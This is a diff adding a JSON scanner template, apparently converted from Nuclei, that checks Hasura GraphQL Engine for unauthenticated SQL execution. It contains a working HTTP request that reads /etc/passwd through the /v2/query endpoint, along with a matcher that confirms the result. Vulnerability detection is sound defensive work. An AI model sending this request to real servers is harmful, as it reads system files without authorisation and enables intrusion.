@@ -1,0 +1,126 @@
+{
+  "id": "hasura-graphql-psql-exec",
+  "name": "Hasura GraphQL Engine - Remote Code Execution",
+  "author": "Udyz",
+  "severity": "CRITICAL",
+  "description": "Hasura GraphQL Engine allows remote unauthenticated users to execute arbitrary SQL statements via the \u0027/v2/query\u0027 endpoint (aka remote code execution).",
+  "references": [
+    "https://www.exploit-db.com/exploits/49802"
+  ],
+  "tags": [
+    "graphql",
+    "edb",
+    "hasura",
+    "rce"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-77",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /v2/query HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \"type\": \"bulk\",\n  \"source\": \"default\",\n  \"args\":[\n    {\n      \"type\": \"run_sql\",\n      \"args\": {\n        \"source\":\"default\",\n        \"sql\":\"SELECT pg_read_file(\u0027/etc/passwd\u0027,0,100000);\",\n        \"cascade\": false,\n        \"read_only\": false\n      }\n    }\n  ]\n}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "hasura-graphql-psql-exec",
+    "info": {
+      "name": "Hasura GraphQL Engine - Remote Code Execution",
+      "author": "Udyz",
+      "severity": "critical",
+      "description": "Hasura GraphQL Engine allows remote unauthenticated users to execute arbitrary SQL statements via the \u0027/v2/query\u0027 endpoint (aka remote code execution).",
+      "reference": [
+        "https://www.exploit-db.com/exploits/49802"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-77"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "graphql,edb,hasura,rce"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /v2/query HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \"type\": \"bulk\",\n  \"source\": \"default\",\n  \"args\":[\n    {\n      \"type\": \"run_sql\",\n      \"args\": {\n        \"source\":\"default\",\n        \"sql\":\"SELECT pg_read_file(\u0027/etc/passwd\u0027,0,100000);\",\n        \"cascade\": false,\n        \"read_only\": false\n      }\n    }\n  ]\n}\n"
+        ],
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
